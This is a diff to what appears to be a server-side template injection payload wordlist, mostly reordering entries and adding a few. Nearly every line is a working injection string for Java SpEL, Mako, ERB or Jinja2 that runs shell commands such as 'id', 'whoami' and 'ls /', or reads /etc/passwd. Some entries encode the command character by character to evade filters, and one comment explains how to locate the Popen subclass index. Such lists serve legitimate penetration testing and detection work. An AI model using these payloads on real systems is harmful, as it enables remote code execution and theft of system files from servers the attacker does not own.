@@ -9,11 +9,8 @@ ${3*3}
 ${42*42}
 ${6*6}
 ${7*7}
-${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}
-${T(java.lang.System).getenv()}
-${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
-${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}${self.module.cache.util.os.system("id")}
 ${donotexists|42*42}
+${open("/tec/passwd","r").read()}
 ${self.__init__.__globals__['util'].os.system('id')}
 ${self.attr._NSAttr__parent.module.cache.compat.inspect.os.system("id")}
 ${self.attr._NSAttr__parent.module.cache.util.os.system("id")}
@@ -37,6 +34,7 @@ ${self.module.cache.util.compat.inspect.linecache.os.system("id")}
 ${self.module.cache.util.compat.inspect.os.system("id")}
 ${self.module.filters.compat.inspect.linecache.os.system("id")}
 ${self.module.filters.compat.inspect.os.system("id")}
+${self.module.runtime.builtins.__import__("subprocess").check_output(["cat","/etc/passwd"])}
 ${self.module.runtime.compat.inspect.linecache.os.system("id")}
 ${self.module.runtime.compat.inspect.os.system("id")}
 ${self.module.runtime.exceptions.compat.inspect.linecache.os.system("id")}
@@ -67,6 +65,10 @@ ${self.template.module.runtime.exceptions.traceback.linecache.os.system("id")}
 ${self.template.module.runtime.exceptions.util.os.system("id")}
 ${self.template.module.runtime.util.compat.inspect.os.system("id")}
 ${self.template.module.runtime.util.os.system("id")}
+${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}
+${T(java.lang.System).getenv()}
+${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
+${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}${self.module.cache.util.os.system("id")}
 ${{3*3}}
 ${{7*7}}
 %23%7B%203%20%2A%203%20%7D%0A
@@ -127,10 +129,10 @@ ${{7*7}}
 <%= 3 * 3 %>
 <%= 7 * 7 %>
 <%= 7*7 %>
+<%= `ls /` %>
 <%= Dir.entries('/') %>
 <%= File.open('/etc/passwd').read %>
 <%= IO.popen('ls /').readlines()  %>
-<%= `ls /` %>
 <%= system("whoami") %>
 <%= system('cat /etc/passwd') %>
 <%=42*42 %>
@@ -191,6 +193,7 @@ ${{7*7}}
 {{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read() }}
 {{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read() }}
 {{''.__class__.__base__.__subclasses__()[227]('cat /etc/passwd', shell=True, stdout=-1).communicate()}}
+{{''.__class__.__base__.__subclasses__()}} # Search for Popen process, use payload below change 227 to index of Popen
 {{''.__class__.mro()[1].__subclasses__()[396]('cat /etc/passwd',shell=True,stdout=-1).communicate()[0].strip()}}
 {{''.__class__.mro()[1].__subclasses__()[396]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}
 {{''.class.mro()[1].subclasses()}}
